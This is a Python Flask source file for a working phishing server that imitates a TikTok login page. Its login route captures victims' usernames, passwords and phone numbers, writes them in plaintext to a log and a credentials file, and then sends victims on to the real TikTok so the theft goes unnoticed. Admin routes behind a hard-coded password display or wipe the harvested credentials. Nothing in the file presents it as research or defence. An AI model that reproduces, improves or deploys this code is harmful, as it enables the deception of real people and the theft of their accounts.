from flask import Flask, request, jsonify, render_template, redirect
from datetime import datetime
import os
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Create credentials file if it doesn't exist
if not os.path.exists("credentials.txt"):
    try:
        with open("credentials.txt", "w") as f:
            f.write(f"Credentials file created at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        logger.info("Credentials file created")
    except Exception as e:
        logger.error(f"Error creating credentials file: {str(e)}")

# -----------------------------
# Frontend Route
# -----------------------------
@app.route('/')
def home():
    return render_template('tiktok.html')

# -----------------------------
# API Routes
# -----------------------------
@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        country_code = data.get('country_code', '+251')
        phone = data.get('phone', '')

        if not username or not password:
            return jsonify({'error': 'Username and password are required'}), 400

        # Log the credentials
        logger.info(f"Login attempt - Username: {username}, Phone: {country_code}{phone}, Password: {password}")

        # Store credentials in text file
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open("credentials.txt", "a") as f:
                f.write(f"{timestamp} - Username: {username}, Phone: {country_code}{phone}, Password: {password}\n")
            logger.info(f"Credentials stored for: {username}")
        except Exception as e:
            logger.error(f"Error storing credentials: {str(e)}")

        # Always return success and redirect to TikTok
        return jsonify({
            'message': 'Login successful',
            'redirect': 'https://www.tiktok.com'
        }), 200
            
    except Exception as e:
        logger.error(f"Error in login: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

# -----------------------------
# Admin Routes
# -----------------------------
@app.route('/admin/credentials')
def view_credentials():
    # Password protection
    if request.args.get('password') != '913421156@Ab':
        return "Unauthorized", 401
        
    try:
        if os.path.exists("credentials.txt"):
            with open("credentials.txt", "r") as f:
                content = f.read()
            return f"<pre>{content}</pre>"
        else:
            return "No credentials file found yet."
    except Exception as e:
        return f"Error reading credentials: {str(e)}"

@app.route('/admin/delete')
def delete_credentials():
    # Password protection
    if request.args.get('password') != '913421156@Ab':
        return "Unauthorized", 401
        
    try:
        if os.path.exists("credentials.txt"):
            os.remove("credentials.txt")
            # Create a new empty file
            with open("credentials.txt", "w") as f:
                f.write(f"Credentials file reset at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            return "Credentials file reset successfully"
        else:
            return "No credentials file to delete"
    except Exception as e:
        return f"Error deleting file: {str(e)}"

# -----------------------------
# Utility Routes
# -----------------------------
@app.route('/init')
def init():
    """Initialize the credentials file"""
    try:
        with open("credentials.txt", "w") as f:
            f.write(f"Credentials file initialized at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        return "Credentials file initialized successfully!"
    except Exception as e:
        return f"Error initializing: {str(e)}"

@app.route('/debug')
def debug():
    """Check if server is working and show file info"""
    try:
        file_exists = os.path.exists("credentials.txt")
        file_size = os.path.getsize("credentials.txt") if file_exists else 0
        
        return f"""
        <h1>Server Debug Info</h1>
        <p>Server time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Credentials file exists: {file_exists}</p>
        <p>Credentials file size: {file_size} bytes</p>
        <p><a href="/admin/credentials?password=913421156@Ab">View Credentials</a></p>
        <p><a href="/init">Initialize File</a></p>
        """
    except Exception as e:
        return f"Debug error: {str(e)}"

@app.route('/test')
def test():
    """Simple test route"""
    return f"Server is working! {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

# -----------------------------
# Main Application Entry Point
# -----------------------------
if __name__ == '__main__':
    # Ensure credentials file exists
    if not os.path.exists("credentials.txt"):
        try:
            with open("credentials.txt", "w") as f:
                f.write(f"Credentials file created at server start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            logger.info("Credentials file created at startup")
        except Exception as e:
            logger.error(f"Error creating credentials file at startup: {str(e)}")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
